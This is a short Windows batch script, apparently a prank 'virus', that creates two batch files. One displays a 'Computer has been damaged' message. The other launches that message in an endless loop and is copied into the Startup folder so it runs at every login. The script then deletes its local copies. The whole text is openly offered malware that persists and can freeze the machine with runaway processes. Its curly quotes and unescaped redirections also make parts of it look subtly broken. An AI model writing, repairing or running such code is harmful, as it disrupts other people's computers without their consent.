@echo off

echo @echo off>HusanboyBayernVirus.bat
echo title Husanboy Bayern Virus>>HusanboyBayernVirus.bat
echo echo.>>HusanboyBayernVirus.bat
echo echo Computer has been damaged by Husanboy>>HusanboyBayernVirus.bat
echo echo.>>HusanboyBayernVirus.bat
echo pause>nul>>HusanboyBayernVirus.bat

echo @echo off>operateHusanboyBayernVirus.bat
echo :repeat>>operateHusanboyBayernVirus.bat
echo start “c:\Windows\HusanboyBayernVirus.bat”>>operateHusanboyBayernVirus.bat
echo goto :repeat>>operateHusanboyBayernVirus.bat

copy “HusanboyBayernVirus.bat” “c:\Windows\”
copy “operateHusanboyBayernVirus.bat” “c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\”
ping localhost -n 1 >nul
del /f /q “HusanboyBayernVirus.bat”
del /f /q “operateHusanboyBayernVirus.bat”

